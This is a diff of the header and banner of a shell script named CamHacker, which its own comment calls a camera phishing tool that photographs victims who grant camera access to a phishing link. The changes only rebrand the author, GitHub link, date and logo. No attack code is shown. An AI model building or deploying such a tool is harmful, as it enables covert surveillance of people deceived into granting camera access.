@@ -3,11 +3,11 @@
 # CamHacker
 # Version    : 2.1
 # Description: CameraHackHack is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
-# Author     : KasRoudra, SUMAN, Online Hacking
-# Github     : https://github.com/OnlineHacKing/
+# Author     : KasRoudra, SUMAN, MasterTG
+# Github     : https://github.com/mastertgtool.git
 # Email      : info@onlinehacking.in
 # Credits    : Suman, Noob-Hackers, TechChipNet, LinuxChoice, CamHacker
-# Date       : 21-04-2022
+# Date       : 19-12-2024
 # Language   : Shell, HTML, Css
 # Portable File
 # If you copy, consider giving credit! We keep our code open source to help others
@@ -32,13 +32,13 @@ ask="${cyan}[${white}?${cyan}] ${purple}"
 error="${cyan}[${white}!${cyan}] ${red}"
 success="${cyan}[${white}√${cyan}] ${green}"
 
-bash OnlineHacking/logo.sh
+bash MasterTG/logo.sh
 
 cwd=`pwd`
 
 # Logo 
 logo="
-${green}    SUMAN       Online Hacking
+${green}    SUMAN       Master Tg
 ${cyan} 
 ${cyan}     ██████  ███████ ███    ███        
 ${cyan}     ██      ██   ██ ████  ████        
